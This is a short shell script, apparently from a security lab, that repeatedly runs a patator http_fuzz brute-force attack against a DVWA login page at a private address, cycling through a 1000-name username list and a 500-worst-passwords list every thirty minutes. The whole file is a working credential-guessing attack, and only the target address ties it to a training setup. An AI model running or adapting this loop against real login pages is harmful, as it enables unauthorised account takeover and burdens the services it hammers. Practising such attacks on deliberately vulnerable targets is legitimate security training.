#!/bin/sh
while true
do
    sudo patator http_fuzz url=http://172.16.1.20/dvwa/login.php method=POST body="username=FILE0&password=FILE1&Login=Login" 0=1000-username-list.txt 1=500-worst-passwords.txt -x ignore:fgrep="Location: login.php"
    sleep 1800 
done
